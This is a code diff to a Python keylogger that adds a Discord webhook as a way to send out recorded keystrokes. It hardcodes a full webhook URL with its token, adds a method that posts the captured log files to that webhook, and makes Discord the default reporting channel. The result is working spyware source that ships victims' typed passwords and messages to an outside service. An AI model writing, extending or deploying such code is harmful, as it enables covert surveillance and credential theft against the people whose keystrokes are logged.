@@ -3,16 +3,18 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+import requests # for sending webhooks to Discord
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "YOUREMAIL"
-EMAIL_PASSWORD = "YOURPASSWORD"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1454988653972553728/IvpH8qCb0wKBdIg-CzhvcvYaz2xw05emJ6VmZ2nxlm06oVrXJXb7jOERFViEuxrPhL12"  # Add your Discord webhook URL here
+
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="email", discord_webhook_url=None):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
+        self.discord_webhook_url = discord_webhook_url
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
@@ -71,6 +73,31 @@ class Keylogger:
         # terminates the session
         server.quit()
 
+    def log_discord(self, webhook_url, file_path):
+            """
+            Send a txt file to Discord webhook
+            webhook_url: Discord webhook URL
+            file_path: Path to the txt file to send
+            """
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    file_content = f.read()
+                
+                # Discord has a 2000 character limit per message, so split if needed
+                if len(file_content) <= 2000:
+                    payload = {"content": f"```\n{file_content}\n```"}
+                    requests.post(webhook_url, json=payload)
+                else:
+                    # Send file as attachment if content is too large
+                    files = {'file': open(file_path, 'rb')}
+                    requests.post(webhook_url, files=files)
+                    files['file'].close()
+                
+                print(f"[+] Sent {file_path} to Discord")
+            except Exception as e:
+                print(f"[-] Error sending to Discord: {e}")
+
+
     def report(self):
         """
         This function gets called every `self.interval`
@@ -85,6 +112,11 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log.encode('ascii', 'ignore').decode('ascii'))
             elif self.report_method == "file":
                 self.report_to_file()
+            elif self.report_method == "discord":
+                if self.discord_webhook_url:
+                    self.log_discord(self.discord_webhook_url, f"{self.filename}.txt")
+                else:
+                    print("[-] Discord webhook URL not configured")
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -111,6 +143,7 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to send to Discord webhook
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="discord", discord_webhook_url=DISCORD_WEBHOOK_URL)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="discord", discord_webhook_url=DISCORD_WEBHOOK_URL)
     keylogger.start()
